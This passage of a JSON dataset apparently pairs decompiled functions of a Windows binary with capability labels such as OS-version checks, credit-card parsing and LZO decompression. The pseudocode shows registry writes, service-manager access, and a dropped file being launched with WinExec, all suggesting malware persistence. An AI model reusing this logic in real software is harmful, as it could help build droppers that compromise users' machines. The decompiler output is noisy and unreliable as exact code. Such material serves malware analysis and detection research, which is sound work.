   var_4h = 0;\n    var_8h = 1;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x4110c0, arg_8h);\n    (*pcVar2)(&var_264h, 0x4110d8, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_34h = 0x411100;\n    var_30h = 0x41110c;\n    var_2ch = 0x411118;\n    var_28h = 0x411128;\n    var_24h = 0x411130;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar4 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((arg_ch != 0) < 5) {\n        uVar4 = (arg_ch != 0) * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1089
    },
    "004031d0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint fcn.004031d0(uint param_1)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    uVar1 = fcn.00401a30(hSCManager, param_1);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 103
    },
    "004038a0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl fcn.004038a0(uint s1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.MSVCRT.dll__strlwr)(s1);\n    var_14h = 0x411474;\n    var_10h = 0x41146c;\n    var_ch = 0x41147c;\n    var_8h = 0x411484;\n    var_4h = 0x41148c;\n    uVar3 = 0;\n    puVar2 = &var_14h;\n    do {\n        iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(s1, *puVar2);\n        if (iVar1 != 0) {\n            return true;\n        }\n        uVar3 = uVar3 + 1;\n        puVar2 = puVar2 + 1;\n    } while (uVar3 < 5);\n    iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(s1, 0x411464);\n    return iVar1 == 0;\n}\n",
        "token_count": 297
    },
    "004041d0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid fcn.004041d0(void)\n\n{\n    uint uVar1;\n    \n    if (*0x4214f0 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x4214f0 = 1;\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "00404870": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004048c3) overlaps instruction at (ram,0x004048c1)\n// \n\nuint fcn.00404870(void)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t extraout_ECX;\n    char *pcVar4;\n    uchar *puVar5;\n    uint *unaff_ESI;\n    int32_t unaff_EDI;\n    bool bVar6;\n    uint8_t in_AF;\n    ulong uVar7;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    uint var_8ch;\n    char cVar3;\n    \n    puVar5 = &stack0xfffffffc;\n    lpVersionInformation = 0x94;\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    pcVar4 = uVar7 >> 0x20;\n    uVar2 = uVar7;\n    bVar6 = (POPCOUNT(var_90h - 5U & 0xff) & 1U) != 0;\n    if (var_90h - 5U == 0) {\n        return 1;\n    }\n    if (bVar6) {\n        if (!bVar6) {\n            out(*unaff_ESI, uVar7 >> 0x20);\n            do {\n                cVar3 = uVar2 >> 8;\n                in_AF = 9 < (uVar2 & 0xf) | in_AF;\n                uVar2 = CONCAT31(CONCAT21(uVar2 >> 0x10, cVar3 - in_AF), -in_AF);\n            } while (in_AF || cVar3 == *pcVar4);\n            piVar1 = unaff_EDI + pcVar4 * 2;\n            *piVar1 = (*piVar1 + 0x7b) - in_AF;\n            bVar6 = *piVar1 == 0;\n            *(extraout_ECX + -0x7d) = uVar2;\n            puVar5 = 0xffffff70;\n            goto code_r0x004048ca;\n        }\n    }\n    bVar6 = var_90h == 6;\ncode_r0x004048ca:\n    if ((bVar6) && (*(puVar5 + -0x8c) == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 530
    },
    "null": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004012c0": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040131a) overlaps instruction at (ram,0x00401319)\n// \n\nvoid __cdecl fcn.004012c0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint extraout_ECX;\n    uint arg_ch_00;\n    int32_t unaff_EBX;\n    uint *puVar2;\n    bool bVar3;\n    ulong uVar4;\n    uint arg_14h;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    bVar3 = true;\n    uVar4 = fcn.004010a0(&var_68h, &var_4h);\n    if ((bVar3) || (!bVar3)) {\n        arg_14h = 0xa020;\n        arg_ch_00 = var_4h;\n    }\n    else {\n        *(unaff_EBX + 0x2068fc55) = *(unaff_EBX + 0x2068fc55) | 0xffffffa0;\n        *uVar4 = *uVar4 + uVar4;\n        arg_ch_00 = uVar4 >> 0x20;\n        arg_14h = extraout_ECX;\n    }\n    fcn.00401fe0(&var_68h, arg_ch_00, 0x407010, arg_14h);\n    *arg_8h = 0x407010;\n    *arg_ch = 0xa020;\n    return;\n}\n",
        "token_count": 441
    },
    "00404510": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404561) overlaps instruction at (ram,0x0040455d)\n// \n// WARNING: Possible PIC construction at 0x004045cf: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x004045d4)\n// WARNING: Removing unreachable block (ram,0x004045d6)\n// WARNING: Removing unreachable block (ram,0x004045eb)\n// WARNING: Removing unreachable block (ram,0x004045df)\n// WARNING: Removing unreachable block (ram,0x004045ee)\n// WARNING: Removing unreachable block (ram,0x0040460b)\n// WARNING: Removing unreachable block (ram,0x00404611)\n// WARNING: Removing unreachable block (ram,0x0040461d)\n// WARNING: Removing unreachable block (ram,0x00404626)\n// WARNING: Removing unreachable block (ram,0x004045b6)\n// WARNING: Removing unreachable block (ram,0x00404628)\n// WARNING: Removing unreachable block (ram,0x0040462f)\n// WARNING: Removing unreachable block (ram,0x00404606)\n// WARNING: Removing unreachable block (ram,0x00404554)\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t fcn.00404510(uint param_1)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uchar *extraout_ECX;\n    uchar *arg_ch;\n    int32_t extraout_ECX_00;\n    uint *arg_8h;\n    uint32_t extraout_EDX;\n    uint extraout_EDX_00;\n    int16_t *unaff_EBX;\n    int16_t *piVar8;\n    int32_t *piVar9;\n    int32_t *unaff_ESI;\n    int16_t *piVar10;\n    int32_t *piVar11;\n    uint *puVar12;\n    bool bVar13;\n    bool bVar14;\n    uchar uVar15;\n    uint64_t uVar16;\n    uint var_8h_2;\n    uint var_20fh;\n    uint var_5ah;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    int32_t *piVar17;\n    uchar *puStack556;\n    uchar *puStack552;\n    int16_t *piStack548;\n    uchar *puStack544;\n    uint uStack540;\n    uchar uStack532;\n    uint uStack531;\n    uint var_10ch_2;\n    uchar auStack12 [4];\n    int16_t *var_4h_2;\n    \n    uStack532 = 0;\n    puVar12 = &stack0xfffffded;\n    for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar12 = 0;\n        puVar12 = puVar12 + 1;\n    }\n    *puVar12 = 0;\n    *(puVar12 + 2) = 0;\n    uVar15 = 0;\n    var_10ch_2._0_1_ = 0;\n    puVar12 = &fcn.00404510::var_10ch_2 + 1;\n    for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar12 = 0;\n        puVar12 = puVar12 + 1;\n    }\n    *puVar12 = 0;\n    piVar17 = puVar12 + 3;\n    *(puVar12 + 2) = 0;\n    puStack544 = &stack0xfffffdec;\n    // WARNING: Bad instruction - Truncating control flow here\n    uStack540 = 0x104;\n    piStack548 = 0x404573;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    puStack552 = &stack0xfffffdec;\n    piStack548 = var_8h_2;\n    puStack556 = 0x411058;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&fcn.00404510::var_10ch_2);\n    if ((uVar15) || (!uVar15)) {\n        arg_ch = &stack0xfffffff4;\n        arg_8h = &fcn.00404510::var_4h_2;\n    }\n    else {\n        *piVar17 = *unaff_ESI;\n        arg_8h = 0x8df84d8d;\n        arg_ch = extraout_ECX;\n        unaff_ESI = unaff_ESI + 1;\n        piVar17 = puVar12 + 7;\n    }\n    uVar3 = fcn.00404470(arg_8h, arg_ch);\n    uVar4 = ((uVar3 & 0xff00 | uVar3 & unaff_EBX >> 8) ^ 0x6200) - 0x3488 & 0x7ee5;\n    piStack548 = var_4h_2;\n    puStack552 = 0x4045d4;\n    piVar9 = &stack0xfffffdd4;\n    puStack556 = &stack0xfffffffc;\n    if ((CARRY4(uVar4, uVar4)) || (!CARRY4(uVar4, uVar4))) {\n        bVar13 = *var_4h_2 == 0x5a4d;\n        uVar4 = extraout_EDX;\n        unaff_EBX = var_4h_2;\n    }\n    else {\n        if (extraout_ECX_00 != 1 && uVar4 == 0) {\n            return CONCAT44(extraout_EDX, var_4h_2);\n        }\n        iVar7 = *unaff_ESI;\n        *piVar17 = unaff_ESI + 1;\n        uVar4 = iVar7 >> 0x1f;\n        *0x8bb8ebc5 = *0x8bb8ebc5 | *0x9750e2b5 >> 8;\n        bVar13 = extraout_ECX_00 + -1 == *(piVar17 + 0x5a);\n        piVar9 = piVar17;\n    }\n    if (!bVar13) {\n        return uVar4 << 0x20;\n    }\n    bVar13 = CARRY4(*(unaff_EBX + 0x1e), unaff_EBX);\n    puVar5 = *(unaff_EBX + 0x1e) + unaff_EBX;\n    if ((!bVar13) && (bVar13)) {\n        out(0xbd, puVar5);\n        return CONCAT44(uVar4, puVar5);\n    }\n    if (*puVar5 != 0x4550) {\n        return uVar4 << 0x20;\n    }\n    if ((0x4550 < *puVar5) && (*puVar5 < 0x4551)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    if (puVar5[0x16] != 0) {\n        return uVar4 << 0x20;\n    }\n    if (*(unaff_EBX + 0x1e) < 0x81) {\n        return uVar4 << 0x20;\n    }\n    uVar1 = *(piVar9[2] + 0x3c);\n    if (uVar1 < 0xc0) {\n        piVar10 = uVar1 - 0x80;\n    }\n    else {\n        piVar10 = 0x40;\n        if (uVar1 < 0xc0) {\n            out(0xbd, uVar1);\n            return CONCAT44(uVar4, uVar1);\n        }\n    }\n    uVar16 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_(piVar10, piVar17, unaff_ESI);\n    piVar6 = uVar16;\n    piVar9[-1] = piVar6;\n    if (piVar6 != NULL) {\n        if ((piVar6 < 0) || (piVar6 >= 0)) {\n            bVar13 = false;\n            bVar14 = piVar10 == NULL;\n            unaff_EBX = NULL;\n            bVar2 = bVar14;\n            goto joined_r0x00404796;\n        }\n        do {\n            piVar10 = piVar6 + -0x1bf31dd6;\n            *unaff_EBX = *unaff_EBX & 0xc3;\n            piVar17 = 0x4047b9;\n            iVar7 = (*_sym.imp.MSVCRT.dll_rand)();\n            piVar6 = piVar9[-1];\n            piVar8 = unaff_EBX + 1;\n            bVar13 = piVar8 < piVar10;\n            bVar14 = piVar8 == piVar10;\n            *(unaff_EBX + piVar6) = iVar7 % 0xff;\n            unaff_EBX = piVar8;\n            bVar2 = bVar13;\njoined_r0x00404796:\n        } while (!bVar2);\n        if ((!bVar13 && !bVar14) && (bVar13 || bVar14)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        piVar11 = piVar6;\n        piVar9 = piVar9[2] + 0x80;\n        for (uVar4 = piVar10 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *piVar9 = *piVar11;\n            piVar11 = piVar11 + 1;\n            piVar9 = piVar9 + 1;\n        }\n        uVar4 = piVar10 & 3;\n        bVar13 = uVar4 != 0;\n        for (; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *piVar9 = *piVar11;\n            piVar11 = piVar11 + 1;\n            piVar9 = piVar9 + 1;\n        }\n        if ((bVar13) && (!bVar13)) {\n            piVar6 = piVar17;\n        }\n        sub.MSVCRT.dll_void___cdecl_operator_delete_void__(piVar6);\n        return CONCAT44(extraout_EDX_00, 1);\n    }\n    return uVar16 & 0xffffffff00000000;\n}\n",
        "token_count": 2370
    },
    "00401350": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00401b10": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00401b10(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x4214e8 == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00404ad0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x411318, acStack1304, &uStack2112);\n    uStack2088 = 0x4113a0;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x4113b8;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00402540(auStack1564, 0x411314, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1869
    },
    "00401820": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004018db) overlaps instruction at (ram,0x004018d6)\n// \n// WARNING: Removing unreachable block (ram,0x00401866)\n// WARNING: Removing unreachable block (ram,0x0040186e)\n\nuint __cdecl fcn.00401820(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint *puVar6;\n    bool bVar7;\n    char in_AF;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar2 = (**0x4214d8)(2, 0);\n    if (iVar2 == -1) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar6 = &var_128h;\n    for (iVar4 = 0x49; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    iVar4 = (**0x4214dc)(iVar2, &var_12ch);\n    pcVar5 = _sym.imp.MSVCRT.dll__stricmp;\n    do {\n        bVar7 = iVar4 == 0;\n        if (bVar7) {\ncode_r0x004018e4:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n            return var_4h;\n        }\n        if ((!bVar7) && (bVar7)) {\n            pcVar5 = pcVar5 + 1;\n            if (pcVar5 == NULL) goto code_r0x004018e4;\n            piVar1 = (CONCAT11(in_AF, in_AF * '\\x06') & 0xff0f) + 0x2a;\n            *piVar1 = *piVar1 - pcVar5;\n            iVar2 = iVar2 + 1;\n        }\n        uVar3 = (*pcVar5)(&var_108h, arg_8h);\n        bVar7 = (POPCOUNT(uVar3 & 0xff) & 1U) != 0;\n        if (uVar3 == 0) {\n            if ((bVar7) && (!bVar7)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            var_4h = var_124h;\n            goto code_r0x004018e4;\n        }\n        iVar4 = (**0x4214e0)(iVar2, &var_12ch);\n    } while( true );\n}\n",
        "token_count": 638
    },
    "004021e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004021fa) overlaps instruction at (ram,0x004021f5)\n// \n\nuint __fastcall fcn.004021e0(uint param_1, int32_t param_2, uint8_t *param_3)\n\n{\n    uint8_t *in_EAX;\n    int32_t iVar1;\n    bool in_PF;\n    \n    if ((in_PF) || (!in_PF)) {\n        in_EAX = param_3;\n    }\n    *in_EAX = *in_EAX | param_1 >> 8;\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(param_2 + 1);\n    if (iVar1 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 170
    },
    "00403230": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004032c9) overlaps instruction at (ram,0x004032c8)\n// \n// WARNING: Removing unreachable block (ram,0x0040325e)\n// WARNING: Type propagation algorithm not settling\n\nuint32_t fcn.00403230(uint param_1)\n\n{\n    int32_t *piVar1;\n    uint hSCManager;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    char **ppcVar4;\n    int32_t extraout_ECX;\n    uchar **unaff_EBP;\n    int32_t *unaff_EDI;\n    int32_t *piVar5;\n    uint *puVar6;\n    ushort in_SS;\n    bool bVar7;\n    bool bVar8;\n    uint var_8h;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uint var_1fh;\n    uchar uStack132;\n    uint uStack131;\n    uchar uStack100;\n    uint uStack99;\n    uchar uStack68;\n    uint uStack67;\n    uchar uStack36;\n    uint uStack35;\n    uchar *puStack4;\n    \n    do {\n        piVar5 = unaff_EDI;\n        if ((0x7f < &puStack4) && (SBORROW4(&puStack4, 0x80) != &uStack132 < 0)) {\n            out(0xc4, in_EAX);\n            piVar5 = unaff_EDI + 1;\n            *unaff_EDI = in_EAX;\n        }\n        puStack4 = unaff_EBP;\n        uVar2 = fcn.00404870();\n        bVar7 = false;\n        bVar8 = (POPCOUNT(uVar2 & 0xff) & 1U) == 0;\n        if (uVar2 == 0) {\n            return 0;\n        }\n        if ((0 < uVar2) && (uVar2 < 1)) {\n            if (extraout_ECX == 0) {\n                hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n                uVar2 = fcn.00401a30(hSCManager, var_8h);\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n                return uVar2;\n            }\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        fcn.00401770();\n        if ((bVar8) || (!bVar8)) break;\n        piVar1 = segment(in_SS, *0x10 + -0xa0);\n        in_EAX = *piVar1;\n        if (bVar7) {\n            ppcVar4 = in_EAX + 0x4214e8;\n            *ppcVar4 = *ppcVar4 + ppcVar4;\n            *ppcVar4 = *ppcVar4 + ppcVar4;\n            goto code_r0x004032c3;\n        }\n        unaff_EBP = &puStack4;\n        unaff_EDI = piVar5;\n    } while (bVar8);\n    iVar3 = fcn.00401820(0x4110a8);\n    if (iVar3 != -1) {\n        return 0;\n    }\ncode_r0x004032c3:\n    fcn.00402b90();\n    *0x4214e8 = 1;\n    iVar3 = fcn.00404820();\n    if (iVar3 != 0) {\n        return 0;\n    }\n    uStack36 = 0;\n    uStack132 = 0;\n    puVar6 = &uStack35;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    uStack100 = 0;\n    puVar6 = &uStack131;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    uStack68 = 0;\n    puVar6 = &uStack99;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    puVar6 = &uStack67;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    iVar3 = fcn.00401d20(&uStack132, &uStack100, &uStack36, &uStack68);\n    if (iVar3 != 0) {\n        iVar3 = fcn.00404510(0xdc);\n        if (iVar3 != 0) {\n            iVar3 = fcn.00404c70(&uStack132, &uStack100, &uStack36, &uStack68);\n            return iVar3 != 0;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 1269
    },
    "004033c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004033c0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.00401820(0x4110b0);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x40, 0, iVar1);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar1, 0, 0, 0, 2);\n    iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 211
    },
    "00403470": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
